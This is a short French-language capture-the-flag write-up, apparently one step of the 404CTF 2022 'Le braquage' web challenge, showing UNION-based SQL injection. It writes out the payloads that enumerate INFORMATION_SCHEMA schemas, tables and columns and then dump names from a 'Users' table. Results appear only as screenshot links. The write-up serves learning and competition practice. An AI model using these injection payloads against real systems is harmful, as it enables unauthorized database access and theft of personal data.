# Informations

Il nous est suggéré d'utiliser ici les ```UNION```. On cherche donc le nombre de champs pour l'injection et on trouve :</br></br>
![image](https://user-images.githubusercontent.com/73934639/174606807-94f0afe3-64a3-48bc-a1b1-ce02e228ed0a.png)
</br>

On cherche le nom de la base de données avec ```schema_name``` de la table ```INFORMATION_SCHEMA.SCHEMATA``` (``` UNION SELECT 1,schema_name from INFORMATION_SCHEMA.SCHEMATA -- -```).
On obtient deux bases de données :</br></br>
![image](https://user-images.githubusercontent.com/73934639/174607177-ca835e49-fe54-4ac0-b8e7-bbf22fb8ba92.png)
</br>

On se concentre maintenant sur la base de données ```UnionVendeurs```. On cherche les tables qu'elle contient (``` ' UNION select TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES where table_schema='UnionVendeurs' -- - ```):</br>
![image](https://user-images.githubusercontent.com/73934639/174607754-a71093ce-9d0f-4963-b26b-55463ca17e09.png)
</br>

La table ```Users``` semble être la plus intéressante. Mais nous ne connaissons pas le nom des colonnes (``` ' UNION select COLUMN_NAME,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='Users' -- - ```):</br>
![image](https://user-images.githubusercontent.com/73934639/174610013-90393f71-c3b6-4b1a-9f4b-c08cfec9af93.png)
</br>

On récupère le nom et le prénom ``` UNION select nom, prenom from Users -- -```:</br>
![image](https://user-images.githubusercontent.com/73934639/174610266-6421865e-fb7a-45ea-bc7d-c0b74ed07d90.png)

Nous pouvons passer à [la dernière étape](https://github.com/Nouman404/404CTF_2022/tree/main/Web/Le%20braquage/Rencontres).
